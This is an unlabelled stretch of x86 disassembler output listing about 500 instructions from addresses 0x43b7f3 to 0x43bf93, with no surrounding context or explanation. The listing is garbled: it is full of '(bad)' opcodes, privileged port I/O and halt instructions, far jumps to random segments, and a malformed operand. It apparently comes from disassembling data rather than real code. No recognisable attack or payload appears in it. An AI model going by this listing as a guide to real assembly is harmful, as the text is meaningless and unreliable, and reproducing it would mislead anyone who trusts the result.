  43b7f3:	sbb    eax,ecx
  43b7f5:	in     eax,dx
  43b7f6:	jns    0x43b80b
  43b7f8:	xor    BYTE PTR [ecx-0x15436ff8],cl
  43b7fe:	sbb    al,0x23
  43b800:	loop   0x43b7a3
  43b802:	jnp    0x43b866
  43b804:	xchg   edx,eax
  43b805:	fild   DWORD PTR [eax-0x1cfc58ad]
  43b80b:	cld    
  43b80c:	sub    ch,BYTE PTR [ecx]
  43b80e:	mov    ebx,0xb145bb54
  43b813:	pop    esi
  43b814:	cmc    
  43b815:	fstp   DWORD PTR [esi-0x1b]
  43b818:	dec    ecx
  43b819:	adc    eax,DWORD PTR ds:0x60194b05
  43b81f:	sub    eax,DWORD PTR [ebx+0x5f]
  43b822:	arpl   WORD PTR [esi],cx
  43b824:	jne    0x43b7f8
  43b826:	je     0x43b81c
  43b828:	jae    0x43b80d
  43b82a:	push   edi
  43b82b:	test   al,0xd8
  43b82d:	retf   0x9112
  43b830:	sbb    cl,BYTE PTR [ecx]
  43b832:	in     eax,dx
  43b833:	and    DWORD PTR [edx-0x24],edi
  43b836:	stc    
  43b837:	sti    
  43b838:	inc    esi
  43b839:	fimul  DWORD PTR [esi]
  43b83b:	int    0x32
  43b83d:	dec    ebx
  43b83e:	int    0xd
  43b840:	aas    
  43b841:	fcmovne st,st(1)
  43b843:	cli    
  43b844:	(bad)  
  43b845:	or     DWORD PTR [eax-0x4594935],eax
  43b84b:	pop    esp
  43b84c:	xor    DWORD PTR [edx-0x75ea269e],edx
  43b852:	in     al,dx
  43b853:	outs   dx,DWORD PTR ds:[esi]
  43b854:	inc    ebp
  43b855:	xor    DWORD PTR ds:0xbc77a79e,edx
  43b85b:	xchg   BYTE PTR [edx],ah
  43b85d:	cmp    DWORD PTR [eax-0x6c],edx
  43b860:	nop
  43b861:	and    dl,BYTE PTR [ecx-0x56]
  43b864:	mov    ch,0xa3
  43b866:	cmp    eax,DWORD PTR [edi+0x72]
  43b869:	push   edi
  43b86a:	mov    ebp,0x5523f75e
  43b86f:	daa    
  43b870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b871:	mov    bh,0xbf
  43b873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b874:	jle    0x43b8d5
  43b876:	stc    
  43b877:	std    
  43b878:	(bad)  
  43b879:	clc    
  43b87a:	mov    ah,0x5d
  43b87c:	add    dh,BYTE PTR [esi-0x9786fe1]
  43b882:	sbb    DWORD PTR [esi-0x3b],edx
  43b885:	and    BYTE PTR [ebp+0x70],bh
  43b888:	clc    
  43b889:	dec    esp
  43b88a:	mov    ebp,0x2683ebb4
  43b88f:	rcl    esi,0x5c
  43b892:	mov    ds:0xc7a41935,al
  43b897:	mov    esi,0x71f4c508
  43b89c:	jl     0x43b85e
  43b89e:	shl    BYTE PTR [esi+ebx*4],1
  43b8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b8a2:	jecxz  0x43b894
  43b8a4:	aaa    
  43b8a5:	imul   ebp,DWORD PTR [ebp-0x4302c863],0xffffffb3
  43b8ac:	(bad)  
  43b8ad:	dec    esi
  43b8ae:	rol    BYTE PTR ds:0x87a44723,1
  43b8b4:	and    eax,0x214d4089
  43b8b9:	mov    ebx,0xc321ae0b
  43b8be:	or     al,0x2b
  43b8c0:	mov    cl,BYTE PTR [edx]
  43b8c2:	ins    BYTE PTR es:[edi],dx
  43b8c3:	adc    esp,DWORD PTR [edx]
  43b8c5:	test   al,0x58
  43b8c7:	js     0x43b8b4
  43b8c9:	push   edx
  43b8ca:	mov    cs:0x1c600ea1,al
  43b8d0:	push   ebp
  43b8d1:	add    eax,0x7976eefd
  43b8d6:	popa   
  43b8d7:	data16 cmc 
  43b8d9:	adc    DWORD PTR [edi-0xe],0x846f8442
  43b8e0:	cld    
  43b8e1:	push   0xffffffae
  43b8e3:	add    eax,0xcd5c493c
  43b8e8:	fisub  DWORD PTR [edx-0x3caeb3f7]
  43b8ee:	pop    ebx
  43b8ef:	ret    
  43b8f0:	lea    ebp,[edx-0x6b]
  43b8f3:	cmc    
  43b8f4:	pop    ss
  43b8f5:	lahf   
  43b8f6:	xor    al,0x76
  43b8f8:	pop    ss
  43b8f9:	dec    ecx
  43b8fa:	repnz mov ds:0xe31cce25,eax
  43b900:	sahf   
  43b901:	mov    eax,ds:0xd35a80eb
  43b906:	in     al,0xd9
  43b908:	arpl   WORD PTR [ecx+eax*1],dx
  43b90b:	stos   BYTE PTR es:[edi],al
  43b90c:	dec    cx
  43b90e:	cmp    BYTE PTR [ebp+esi*1-0x25],0x39
  43b913:	shr    DWORD PTR [ecx-0x27],0xc1
  43b917:	mov    WORD PTR [ebp-0xa5f0c6f],gs
  43b91d:	aad    0x41
  43b91f:	icebp  
  43b920:	sub    dh,dh
  43b922:	mov    al,BYTE PTR ds:0x7e980917
  43b928:	ins    DWORD PTR es:[edi],dx
  43b929:	fistp  WORD PTR [edi+eax*4-0x4450b1b8]
  43b930:	sbb    eax,0x8963d151
  43b935:	mov    bh,BYTE PTR [ebp+0x6d]
  43b938:	or     BYTE PTR [ebx-0x7e],bh
  43b93b:	push   ebx
  43b93c:	adc    dh,dl
  43b93e:	xor    al,bl
  43b940:	jns    0x43b9b0
  43b942:	inc    edx
  43b943:	jmp    0x9d89:0xee4e6814
  43b94a:	jnp    0x43b8fa
  43b94c:	and    eax,0x2237f35d
  43b951:	sub    DWORD PTR [ebp*2+0xcfe016],edx
  43b958:	dec    esi
  43b959:	sbb    DWORD PTR [edi-0x62fee4ef],ebp
  43b95f:	lods   eax,DWORD PTR ds:[esi]
  43b960:	dec    edi
  43b961:	int3   
  43b962:	(bad)  
  43b963:	jge    0x43b984
  43b965:	push   ebx
  43b966:	leave  
  43b967:	ins    DWORD PTR es:[edi],dx
  43b968:	and    cl,ch
  43b96a:	sahf   
  43b96b:	mov    ch,0x22
  43b96d:	or     bl,dh
  43b96f:	aas    
  43b970:	fwait
  43b971:	fwait
  43b972:	jcxz   0x43b983
  43b975:	sbb    ch,BYTE PTR ss:[ecx+0xd47b036]
  43b97c:	test   al,0x5b
  43b97e:	mov    eax,0xf006ba14
  43b983:	cld    
  43b984:	add    eax,0xf9ecc9bb
  43b989:	aaa    
  43b98a:	adc    BYTE PTR [ecx-0x33bd2fb1],0x87
  43b991:	jno    0x43b94e
  43b993:	les    ebp,FWORD PTR [eax-0x70]
  43b996:	int3   
  43b997:	sbb    eax,0x6dea153a
  43b99c:	hlt    
  43b99d:	and    bl,0xb4
  43b9a0:	adc    esp,DWORD PTR [edx+0x2191fa39]
  43b9a6:	pop    ebp
  43b9a7:	and    bh,dl
  43b9a9:	mov    dl,BYTE PTR [ebp+0x24d7e936]
  43b9af:	inc    ecx
  43b9b0:	sbb    BYTE PTR [ebp+0x2606ebb5],0x16
  43b9b7:	test   BYTE PTR ds:0x1085e3d6,ah
  43b9bd:	sub    BYTE PTR [eax],ah
  43b9bf:	and    eax,0x43f5f25
  43b9c4:	inc    ebp
  43b9c5:	pop    ecx
  43b9c6:	sbb    al,0x1d
  43b9c8:	mov    al,ds:0x2bba9582
  43b9cd:	fnstcw WORD PTR [eax+0x5e]
  43b9d0:	out    0xaa,eax
  43b9d2:	fwait
  43b9d3:	and    DWORD PTR [ebx],0xffffff9b
  43b9d6:	fdiv   QWORD PTR [esi]
  43b9d8:	lds    ebx,FWORD PTR [eax]
  43b9da:	ds bnd jno 0x43b9c1
  43b9de:	sbb    eax,0xb589213a
  43b9e3:	inc    BYTE PTR [eax-0x37]
  43b9e6:	bound  ecx,QWORD PTR [eax-0x7a]
  43b9e9:	pusha  
  43b9ea:	fistp  DWORD PTR [esi+eiz*1-0x2daaaf7e]
  43b9f1:	mov    eax,ds:0x62ffdd28
  43b9f6:	and    edx,DWORD PTR [esi+0x1f]
  43b9f9:	ins    BYTE PTR es:[edi],dx
  43b9fa:	xor    ebx,edx
  43b9fc:	iret   
  43b9fd:	dec    esi
  43b9fe:	mov    ebp,0xba371304
  43ba03:	stos   DWORD PTR es:[edi],eax
  43ba04:	add    eax,0x1af2bf39
  43ba09:	jg     0x43ba2b
  43ba0b:	pushf  
  43ba0c:	sbb    DWORD PTR [ecx-0x4f8bef18],ebx
  43ba12:	xchg   esp,eax
  43ba13:	xchg   BYTE PTR [esi-0x5e],cl
  43ba16:	mov    ebx,0x3a24b0a5
  43ba1b:	xchg   BYTE PTR [ecx+0x77],bh
  43ba1e:	test   eax,0xbaaee617
  43ba23:	(bad)  
  43ba24:	lock mov cl,0x89
  43ba27:	ja     0x43ba1e
  43ba29:	js     0x43b9d5
  43ba2b:	clc    
  43ba2c:	rcl    bl,cl
  43ba2e:	(bad)  
  43ba2f:	fstp   TBYTE PTR [edi+esi*8-0x48f515a9]
  43ba36:	mov    ebx,0x55537824
  43ba3b:	adc    esp,DWORD PTR ds:0xbcc64c15
  43ba41:	mov    edi,0x9866678c
  43ba46:	loopne 0x43ba37
  43ba48:	push   ss
  43ba49:	jns    0x43ba7a
  43ba4b:	popa   
  43ba4c:	imul   BYTE PTR [edi-0x2107ec80]
  43ba52:	jmp    0x43b9d8
  43ba54:	inc    edi
  43ba55:	sbb    BYTE PTR [esi-0x3],0x71
  43ba59:	js     0x43ba80
  43ba5b:	hlt    
  43ba5c:	add    esi,DWORD PTR [ecx]
  43ba5e:	xor    BYTE PTR [edx-0xb4a183c],0x3e
  43ba65:	and    edx,DWORD PTR [esi-0x28]
  43ba68:	test   DWORD PTR [ebx+0x1e23ec50],esi
  43ba6e:	call   0xc92b:0xcdc80128
  43ba75:	xchg   esp,eax
  43ba76:	push   esp
  43ba77:	aad    0x3e
  43ba79:	cdq    
  43ba7a:	(bad)  
  43ba7b:	mov    BYTE PTR [ebx+0x3ac9a1a1],bl
  43ba81:	pushf  
  43ba82:	retf   
  43ba83:	push   ebx
  43ba84:	pop    ebp
  43ba85:	lods   eax,DWORD PTR ds:[esi]
  43ba86:	push   cs
  43ba87:	inc    ecx
  43ba88:	fild   QWORD PTR [edx*1+0x7088d693]
  43ba8f:	ss cdq 
  43ba91:	sub    DWORD PTR [ecx+0x5b9be05c],edi
  43ba97:	or     ebx,DWORD PTR [ebp+0x57]
  43ba9a:	in     al,dx
  43ba9b:	fimul  DWORD PTR [ebx-0x24]
  43ba9e:	in     al,0x73
  43baa0:	xchg   edi,eax
  43baa1:	inc    edx
  43baa2:	fiadd  DWORD PTR [ebp+edi*2-0x54]
  43baa6:	das    
  43baa7:	std    
  43baa8:	(bad)  [esi-0x7]
  43baab:	xchg   ecx,eax
  43baac:	and    eax,0xd5edd89b
  43bab1:	sar    edi,cl
  43bab3:	(bad)  
  43bab4:	dec    edi
  43bab5:	mov    DWORD PTR [eax+eax*1-0x4f],eax
  43bab9:	mov    al,BYTE PTR [ebx]
  43babb:	ins    DWORD PTR es:[edi],dx
  43babc:	(bad)  
  43babd:	enter  0xf381,0xe9
  43bac1:	sar    bl,cl
  43bac3:	add    BYTE PTR gs:[edx-0x59],cl
  43bac7:	loopne 0x43bb0a
  43bac9:	pop    ebp
  43baca:	data16 lods al,BYTE PTR ds:[esi]
  43bacc:	and    BYTE PTR ds:0xc91a4b75,ch
  43bad2:	jmp    0x96d205d5
  43bad7:	push   0x543c0973
  43badc:	loop   0x43ba78
  43bade:	jno    0x43ba88
  43bae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bae1:	icebp  
  43bae2:	xchg   edi,eax
  43bae3:	out    dx,al
  43bae4:	pop    ss
  43bae5:	sub    esp,ebp
  43bae7:	pop    ebp
  43bae8:	imul   esi,DWORD PTR [eax+esi*1+0x4ba15d5c],0x76
  43baf0:	add    ebx,DWORD PTR [edi-0x5a]
  43baf3:	and    bh,0xe3
  43baf6:	xor    DWORD PTR [ebx],esi
  43baf8:	jl     0x43bb31
  43bafa:	pop    es
  43bafb:	pop    esp
  43bafc:	sbb    BYTE PTR [edx],ah
  43bafe:	aas    
  43baff:	mov    DWORD PTR [esi-0xd],ecx
  43bb02:	xchg   edx,eax
  43bb03:	xlat   BYTE PTR ds:[ebx]
  43bb04:	pop    ds
  43bb05:	jmp    0xc900daa6
  43bb0a:	pop    esi
  43bb0b:	ins    BYTE PTR es:[edi],dx
  43bb0c:	adc    eax,0x65e8558a
  43bb11:	or     eax,0x49cdffb4
  43bb16:	add    DWORD PTR [ecx],edx
  43bb18:	nop
  43bb19:	pushf  
  43bb1a:	jecxz  0x43bb28
  43bb1c:	mov    dl,0x4d
  43bb1e:	add    BYTE PTR [ebx],ah
  43bb20:	lds    edx,FWORD PTR [edx-0x4d6b0c12]
  43bb26:	inc    esi
  43bb27:	nop    DWORD PTR [ecx]
  43bb2a:	sahf   
  43bb2b:	cmp    ah,0xd7
  43bb2e:	xchg   edx,eax
  43bb2f:	fdivr  QWORD PTR [esi+0x329a1c7f]
  43bb35:	sub    edi,eax
  43bb37:	sti    
  43bb38:	outs   dx,DWORD PTR ds:[esi]
  43bb39:	xor    al,0xb0
  43bb3b:	call   0x1df5:0xdbcf6920
  43bb42:	aam    0xab
  43bb44:	out    dx,al
  43bb45:	mov    ds:0xab97d99b,eax
  43bb4a:	stos   BYTE PTR es:[edi],al
  43bb4b:	cmp    al,0x77
  43bb4d:	sbb    DWORD PTR [esi-0x36218c28],0xb05e0a54
  43bb57:	call   0x28f5ca30
  43bb5c:	xchg   ebp,eax
  43bb5d:	aaa    
  43bb5e:	outs   dx,BYTE PTR ds:[esi]
  43bb5f:	hlt    
  43bb60:	dec    esi
  43bb61:	jb     0x43bb1f
  43bb63:	out    dx,eax
  43bb64:	sbb    ebp,DWORD PTR [ecx+0x593fd6b2]
  43bb6a:	pop    edi
  43bb6b:	scas   al,BYTE PTR es:[edi]
  43bb6c:	adc    BYTE PTR [ebp-0x55215a45],bl
  43bb72:	enter  0x44ac,0xff
  43bb76:	mov    esp,0xbf2ab780
  43bb7b:	je     0x43bbf5
  43bb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bb7e:	mov    cl,0xf6
  43bb80:	inc    ebp
  43bb81:	addr16 shr eax,cl
  43bb84:	inc    esi
  43bb85:	ins    BYTE PTR es:[edi],dx
  43bb86:	add    ebx,DWORD PTR [edi+0x19]
  43bb89:	test   eax,0x4affc9fc
  43bb8e:	popf   
  43bb8f:	or     bh,BYTE PTR [eax-0x421d2453]
  43bb95:	cwde   
  43bb96:	mov    DWORD PTR [esi+0x7e],edi
  43bb99:	lahf   
  43bb9a:	pop    ebp
  43bb9b:	add    ah,BYTE PTR [edi]
  43bb9d:	pusha  
  43bb9e:	out    dx,al
  43bb9f:	or     DWORD PTR [ebx-0x255b407e],ecx
  43bba5:	cmp    eax,0xde675713
  43bbaa:	cwde   
  43bbab:	scas   eax,DWORD PTR es:[edi]
  43bbac:	add    eax,0x4aa809db
  43bbb1:	and    eax,0x11320f7c
  43bbb6:	mov    ecx,DWORD PTR [ebx-0x2f]
  43bbb9:	cdq    
  43bbba:	into   
  43bbbb:	neg    DWORD PTR [ebx+0x13956867]
  43bbc1:	retf   0x74b2
  43bbc4:	jns    0x43bc30
  43bbc6:	rcr    DWORD PTR [esi+0x3c841136],0x8b
  43bbcd:	mov    WORD PTR [ebx],?
  43bbcf:	sti    
  43bbd0:	inc    ecx
  43bbd1:	ds mov bl,0xe4
  43bbd4:	add    dl,BYTE PTR [ecx+0xc]
  43bbd7:	sbb    al,0x7f
  43bbd9:	or     DWORD PTR [edi+0x39],eax
  43bbdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bbdd:	mov    edi,0x9cb3f225
  43bbe2:	imul   eax,DWORD PTR [eax-0x59],0x5b
  43bbe6:	mov    ax,ds:0xa343020d
  43bbec:	pop    ebp
  43bbed:	or     eax,0x5b6674b0
  43bbf2:	add    ebp,DWORD PTR [esi+esi*2-0x78]
  43bbf6:	add    eax,DWORD PTR gs:[ecx]
  43bbf9:	add    eax,0x31925cd2
  43bbfe:	lock test eax,0x54b80950
  43bc04:	dec    ebx
  43bc05:	jae    0x43bc1e
  43bc07:	addr16 in eax,0x86
  43bc0a:	shl    ch,1
  43bc0c:	inc    edx
  43bc0d:	jge    0x43bc70
  43bc0f:	fcmovu st,st(7)
  43bc11:	jo     0x43bbe8
  43bc13:	adc    BYTE PTR [edi-0x3abb4675],0xb3
  43bc1a:	mov    eax,ds:0x29dcc5d3
  43bc1f:	jmp    0x43bbc7
  43bc21:	cmp    bl,al
  43bc23:	cdq    
  43bc24:	sbb    cl,cl
  43bc26:	outs   dx,DWORD PTR ds:[esi]
  43bc27:	push   esi
  43bc28:	or     bl,BYTE PTR [edx]
  43bc2a:	pop    es
  43bc2b:	idiv   DWORD PTR [edx+ebx*4+0x6b]
  43bc2f:	mov    cl,dl
  43bc31:	inc    edi
  43bc32:	jge    0x43bcad
  43bc34:	xor    ebx,ebx
  43bc36:	dec    edi
  43bc37:	fmulp  st(3),st
  43bc39:	xchg   esi,eax
  43bc3a:	mov    esi,0x71a842c4
  43bc3f:	das    
  43bc40:	or     eax,0xc7004ba3
  43bc45:	imul   ebp,DWORD PTR [ecx-0x64],0xaa31ae46
  43bc4c:	outs   dx,DWORD PTR ds:[esi]
  43bc4d:	xor    BYTE PTR [edi-0x7d8917c],0x17
  43bc54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc55:	dec    esi
  43bc56:	xchg   ebp,eax
  43bc57:	repnz push esi
  43bc59:	adc    BYTE PTR ss:0xb80bb91a,bl
  43bc60:	pushf  
  43bc61:	mov    DWORD PTR [edx+0x5f],edx
  43bc64:	imul   edi,DWORD PTR [ecx],0xca95afc3
  43bc6a:	xchg   edi,eax
  43bc6b:	lock add BYTE PTR [eax-0x26dc984e],dh
  43bc72:	push   edi
  43bc73:	or     BYTE PTR [ebp-0x3f32cf1d],ch
  43bc79:	ins    DWORD PTR es:[edi],dx
  43bc7a:	jg     0x43bc20
  43bc7c:	inc    DWORD PTR [ecx]
  43bc7e:	adc    dh,BYTE PTR [ebx+0x18]
  43bc81:	leave  
  43bc82:	lahf   
  43bc83:	or     dl,BYTE PTR [edi-0x4d]
  43bc86:	cmp    DWORD PTR [edx-0x78],edi
  43bc89:	test   dl,0x64
  43bc8c:	stos   BYTE PTR es:[edi],al
  43bc8d:	jge    0x43bc44
  43bc8f:	daa    
  43bc90:	adc    al,0x82
  43bc92:	es jb  0x43bc1a
  43bc95:	or     al,ah
  43bc97:	out    dx,al
  43bc98:	add    DWORD PTR [edi+0x0],0xffffffd3
  43bc9c:	sbb    ch,cl
  43bc9e:	sub    al,0xb3
  43bca0:	loope  0x43bc80
  43bca2:	out    0xe5,al
  43bca4:	bound  ebx,QWORD PTR [eax+eiz*8]
  43bca7:	fisub  WORD PTR ds:0x10810439
  43bcad:	sar    eax,0x56
  43bcb0:	sbb    eax,0x532fab39
  43bcb5:	fxch   st(3)
  43bcb7:	out    0xb,eax
  43bcb9:	xlat   BYTE PTR ds:[ebx]
  43bcba:	pop    ebx
  43bcbb:	dec    edi
  43bcbc:	retf   0x7781
  43bcbf:	jmp    0xe4a3:0xf10746a0
  43bcc6:	dec    edx
  43bcc7:	push   ds
  43bcc8:	xchg   cl,bh
  43bcca:	and    BYTE PTR [eax+eiz*2+0x3e],bl
  43bcce:	int    0x17
  43bcd0:	aas    
  43bcd1:	mov    cl,0xb2
  43bcd3:	pop    ebx
  43bcd4:	jne    0x43bd53
  43bcd6:	pop    ebp
  43bcd7:	icebp  
  43bcd8:	and    cx,WORD PTR [ebp+0x757a5254]
  43bcdf:	dec    ecx
  43bce0:	mov    edi,0xc5823d07
  43bce5:	dec    esi
  43bce6:	sbb    eax,0xb769fdeb
  43bceb:	dec    ebp
  43bcec:	jle    0x43bcbc
  43bcee:	mov    al,0xd4
  43bcf0:	dec    ebx
  43bcf1:	cli    
  43bcf2:	cmp    ch,ch
  43bcf4:	push   esi
  43bcf5:	sti    
  43bcf6:	addr16 push ds
  43bcf8:	or     ch,bl
  43bcfa:	pop    eax
  43bcfb:	arpl   WORD PTR [esi+0x31],bp
  43bcfe:	xor    eax,0xbe480fee
  43bd03:	aam    0x48
  43bd05:	enter  0x415c,0xb5
  43bd09:	jg     0x43bce4
  43bd0b:	jmp    0xa22bed4d
  43bd10:	and    eax,0x7067e769
  43bd15:	jns    0x43bd37
  43bd17:	mov    bh,0x9c
  43bd19:	aad    0x92
  43bd1b:	out    0xb5,al
  43bd1d:	out    0xa6,eax
  43bd1f:	out    0x14,al
  43bd21:	push   cs
  43bd22:	xor    eax,0x67d9ffcc
  43bd27:	sub    cl,ah
  43bd29:	rcr    DWORD PTR ds:0x369eff2a,1
  43bd2f:	dec    ebx
  43bd30:	scas   al,BYTE PTR es:[edi]
  43bd31:	mov    ch,0x1b
  43bd33:	mov    al,0x14
  43bd35:	jg     0x43bcc7
  43bd37:	xor    eax,0x7a81a4cb
  43bd3c:	sub    DWORD PTR [ecx],ebp
  43bd3e:	ret    0x1953
  43bd41:	mov    al,0x48
  43bd43:	test   BYTE PTR [edi+eiz*1-0x61829952],ah
  43bd4a:	jmp    0x43bd02
  43bd4c:	xor    DWORD PTR [edx+0x23],edx
  43bd4f:	jno    0x43bd2f
  43bd51:	fst    st(6)
  43bd53:	inc    ebp
  43bd54:	aas    
  43bd55:	test   BYTE PTR [ecx-0x30a98a6c],dh
  43bd5b:	pushf  
  43bd5c:	xor    eax,0x1ae7cb2f
  43bd61:	in     al,dx
  43bd62:	cmc    
  43bd63:	lds    esp,FWORD PTR [ecx]
  43bd65:	mov    DWORD PTR [edi-0x36],esi
  43bd68:	ds adc eax,ecx
  43bd6b:	nop
  43bd6c:	(bad)  
  43bd6d:	pop    ss
  43bd6e:	dec    esp
  43bd6f:	jmp    0x26a90d74
  43bd74:	adc    eax,0x20ef908c
  43bd79:	leave  
  43bd7a:	pop    esp
  43bd7c:	push   ss
  43bd7d:	daa    
  43bd7e:	xchg   ebx,eax
  43bd7f:	add    dh,ch
  43bd81:	pop    ds
  43bd82:	lds    edi,FWORD PTR [esi+0x37]
  43bd85:	dec    eax
  43bd86:	in     eax,dx
  43bd87:	ret    0xc2c9
  43bd8a:	push   esp
  43bd8b:	call   0xdfb52d20
  43bd90:	and    al,0xd9
  43bd92:	mul    ebx
  43bd94:	loop   0x43be13
  43bd96:	(bad)  
  43bd97:	call   0xe1e6:0x995c0d28
  43bd9e:	or     al,0xb0
  43bda0:	dec    esi
  43bda1:	js     0x43bdb9
  43bda3:	out    dx,al
  43bda4:	sbb    al,0x89
  43bda6:	loope  0x43bdb5
  43bda8:	inc    ecx
  43bda9:	ror    WORD PTR fs:[ebx*2-0x63f890e3],cl
  43bdb2:	daa    
  43bdb3:	dec    edx
  43bdb4:	sub    eax,0x2addc4fa
  43bdb9:	jns    0x43be2f
  43bdbb:	inc    ebx
  43bdbc:	add    edx,DWORD PTR [edi]
  43bdbe:	push   ss
  43bdbf:	stc    
  43bdc0:	cmc    
  43bdc1:	mov    bh,0xdd
  43bdc3:	int3   
  43bdc4:	and    BYTE PTR [ebx+0x73],dh
  43bdc7:	add    al,0x45
  43bdc9:	loopne 0x43bdaf
  43bdcb:	bnd jg 0x43bdbe
  43bdce:	shl    BYTE PTR [ebx+0x703dd75e],0xfe
  43bdd5:	fdivr  DWORD PTR [edx+0x27b7ea74]
  43bddb:	out    dx,eax
  43bddc:	out    0x20,eax
  43bdde:	fisttp WORD PTR [esi*1-0x311a5030]
  43bde5:	and    DWORD PTR [eax-0x44245016],esi
  43bdeb:	hlt    
  43bdec:	inc    edx
  43bded:	inc    esp
  43bdee:	retf   0x6a7
  43bdf1:	and    al,0x2e
  43bdf3:	fsub   QWORD PTR [ebx+edx*8]
  43bdf6:	(bad)  
  43bdf7:	call   0x2a06f4e6
  43bdfc:	jge    0x43bdac
  43bdfe:	mov    ebp,0xd13b7194
  43be03:	mov    dl,0xb5
  43be05:	and    eax,0xb62ef386
  43be0a:	sbb    esp,DWORD PTR [ecx-0x29]
  43be0d:	or     eax,0x96f5ba39
  43be12:	in     eax,0xe5
  43be14:	sbb    BYTE PTR [ebx+ecx*4+0x15],0x65
  43be19:	jecxz  0x43bda3
  43be1b:	jmp    0x591b:0x33780bfb
  43be22:	jo     0x43be24
  43be24:	imul   eax,DWORD PTR [esi-0x64d41943],0xb
  43be2b:	mov    cl,0x81
  43be2d:	dec    ebx
  43be2e:	xor    eax,ebp
  43be30:	(bad)  
  43be31:	jmp    0xb689:0xa02e
  43be37:	add    al,0x3e
  43be39:	add    al,0x5c
  43be3b:	icebp  
  43be3c:	mov    dh,0x33
  43be3e:	sti    
  43be3f:	add    eax,0x8a90764
  43be44:	inc    esi
  43be45:	mov    ecx,DWORD PTR [ecx+0x3292bd1a]
  43be4b:	hlt    
  43be4c:	adc    eax,0xef13200
  43be51:	add    esp,DWORD PTR [ecx-0x43]
  43be54:	push   ds
  43be55:	sub    edx,edi
  43be57:	imul   BYTE PTR ds:0x52c81eb7
  43be5d:	scas   al,BYTE PTR es:[edi]
  43be5e:	fwait
  43be5f:	mov    DWORD PTR [esi],ecx
  43be61:	or     edx,DWORD PTR [ebx+0x2d]
  43be64:	cmp    al,ch
  43be66:	jns    0x43be7a
  43be68:	or     BYTE PTR [edx-0x45],cl
  43be6b:	int3   
  43be6c:	icebp  
  43be6d:	mov    ds:0x33a7c23b,al
  43be72:	fiadd  WORD PTR [eax-0x2957768a]
  43be78:	and    eax,0x47037143
  43be7d:	mov    ecx,0x77c58edf
  43be82:	mov    esp,0xc33331a4
  43be87:	mov    ebp,0xf9fcb315
  43be8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be8d:	hlt    
  43be8e:	ins    BYTE PTR es:[edi],dx
  43be8f:	jmp    0x2a06:0x2cf0f7d3
  43be96:	mov    ebx,0x9a1f552
  43be9b:	xchg   ebp,eax
  43be9c:	xchg   esi,eax
  43be9d:	aas    
  43be9e:	push   eax
  43be9f:	in     al,dx
  43bea0:	shl    BYTE PTR [ebx+0x1d],0xe8
  43bea4:	add    DWORD PTR [edx+0x7551a20b],esp
  43beaa:	lds    edx,FWORD PTR [ecx]
  43beac:	pop    ds
  43bead:	leave  
  43beae:	push   eax
  43beaf:	out    dx,al
  43beb0:	and    esp,DWORD PTR [ecx+0x78]
  43beb3:	fcmovnbe st,st(0)
  43beb5:	adc    BYTE PTR [ebp+ebx*8+0x78],bh
  43beb9:	pushf  
  43beba:	les    edi,FWORD PTR ds:0x1732b649
  43bec0:	rcl    eax,0xb6
  43bec3:	push   eax
  43bec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bec5:	ror    BYTE PTR [esi-0x4d93457a],1
  43becb:	js     0x43bf23
  43becd:	cmp    esp,0x3eea052e
  43bed3:	pop    ss
  43bed4:	rcr    BYTE PTR [esi-0x15f66d41],1
  43beda:	push   ecx
  43bedb:	jle    0x43bf4a
  43bedd:	fdivr  DWORD PTR ds:0x991c3591
  43bee3:	jle    0x43bf60
  43bee5:	push   ss
  43bee6:	ficomp DWORD PTR ds:[eax]
  43bee9:	inc    edi
  43beea:	inc    ebx
  43beeb:	push   es
  43beec:	and    ch,BYTE PTR [ecx+0x20ac4732]
  43bef2:	fsubr  DWORD PTR [esi]
  43bef4:	xchg   DWORD PTR [ebx-0x60eecbd2],eax
  43befa:	fwait
  43befb:	or     ch,BYTE PTR [esi-0x44]
  43befe:	mov    ebp,fs
  43bf00:	and    DWORD PTR [ecx],ebx
  43bf02:	sbb    DWORD PTR [esi-0x2d],esi
  43bf05:	adc    DWORD PTR [esi+0x7b9f33b3],0x1caae62e
  43bf0f:	dec    eax
  43bf10:	out    0x67,al
  43bf12:	and    al,BYTE PTR [ebp-0x4b223180]
  43bf18:	fcomp  QWORD PTR [edx-0x5da9bd57]
  43bf1e:	sbb    edi,DWORD PTR [ecx+0x38]
  43bf21:	lock fcomp QWORD PTR [ebp-0xb]
  43bf25:	fnstsw WORD PTR [eax]
  43bf27:	inc    ebx
  43bf28:	xor    al,0xa5
  43bf2a:	stos   DWORD PTR es:[edi],eax
  43bf2b:	out    dx,al
  43bf2c:	xchg   esi,eax
  43bf2d:	test   al,0x95
  43bf30:	xor    ebp,esi
  43bf32:	sub    eax,0xa75d0abf
  43bf37:	in     eax,0x4d
  43bf39:	xlat   BYTE PTR ds:[ebx]
  43bf3a:	mov    ch,0xef
  43bf3c:	or     al,BYTE PTR ds:0x88c46bf3
  43bf42:	stos   DWORD PTR es:[edi],eax
  43bf43:	cs mov ch,0xfc
  43bf46:	out    dx,al
  43bf47:	out    0x93,eax
  43bf49:	jns    0x43bf2f
  43bf4b:	sub    al,0x58
  43bf4d:	cmp    ah,bh
  43bf4f:	call   0x8e9f912c
  43bf54:	push   0x13
  43bf56:	inc    esi
  43bf57:	lock add DWORD PTR ds:0x95856b3c,esp
  43bf5e:	(bad)  
  43bf5f:	in     al,0x37
  43bf61:	xor    bl,ch
  43bf63:	cdq    
  43bf64:	adc    al,0x4a
  43bf66:	test   dh,dh
  43bf68:	push   es
  43bf69:	mov    al,0xbf
  43bf6b:	lock cmp dh,BYTE PTR [ebx+0x30]
  43bf6f:	xor    esi,DWORD PTR [ecx]
  43bf71:	sar    DWORD PTR [ebx-0x5f6e9d2a],cl
  43bf77:	je     0x43bf92
  43bf79:	test   al,0xa4
  43bf7b:	xor    eax,0x33e2c922
  43bf80:	xor    BYTE PTR [esp+edi*1-0x26],cl
  43bf84:	xor    BYTE PTR ds:0x191b2ccf,bh
  43bf8a:	xchg   esi,eax
  43bf8b:	fsubr  st,st(2)
  43bf8d:	mov    BYTE PTR [ebp+0x4b],bh
  43bf90:	push   es
  43bf91:	std    
  43bf92:	cdq    
  43bf93:	pop    ebp
